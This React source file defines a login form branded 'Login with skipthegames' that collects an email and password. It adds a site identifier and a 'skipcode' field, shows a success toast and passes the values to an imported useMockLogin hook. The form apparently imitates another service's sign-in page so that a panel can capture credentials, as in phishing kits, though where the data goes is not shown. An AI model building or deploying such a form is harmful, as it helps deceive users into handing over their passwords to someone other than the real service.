import { Field, Form, Formik } from 'formik';
import useMockLogin from '../hooks/useMockLogin';
import { site } from '../config';
import { toast } from 'react-toastify';

function LoginForm() {
  const initialvalues = {
    email: '',
    password: '',
    remember: '',
  };

  const { login } = useMockLogin();

  const handleSubmit = (values, formik) => {
    const { email, password } = values;

    // console.log("values", values);
    // return;

    const submitValues = {
      site: site,
      email: email,
      password: password,
      skipcode: '',
    };
    toast.success('successfully submitted');
    console.log(submitValues);

    login(submitValues, formik);

    // console.log(submitValues);
  };

  return (
    <div className="px-5 mx-auto mt-[200px] lg:px-10  pb-10 md:w-[420px] bg-white w-[400px] shadow-lg rounded-lg">
      <h3 className="text-[25px] font-bold text-[#222222] text-center lg:text-left">
      Login with skipthegames
      </h3>

      <div className="mt-5">
        <Formik
          initialValues={initialvalues}
          // validationSchema={validate}
          onSubmit={handleSubmit}
        >
          {formik => (
            <Form className="">
              <Field
                className="w-full text-lg px-[8px] py-[7px] outline-none border border-[#1a73e8] shadow-inner placeholder:font-medium placeholder:text-black/50"
                placeholder="Your email"
                name="email"
                type="email"
                required
              />

              <Field
                className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-[#1a73e8] shadow-inner placeholder:font-medium placeholder:text-black/50"
                placeholder="Password"
                name="password"
                type="password"
                autoComplete="on"
                required
              />

              <button
                type="submit"
                className="mt-5 w-full text-lg font-medium bg-[#1a73e8] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 rounded"
              >
                Log in
              </button>
            </Form>
          )}
        </Formik>
      </div>
    </div>
  );
}

export default LoginForm;
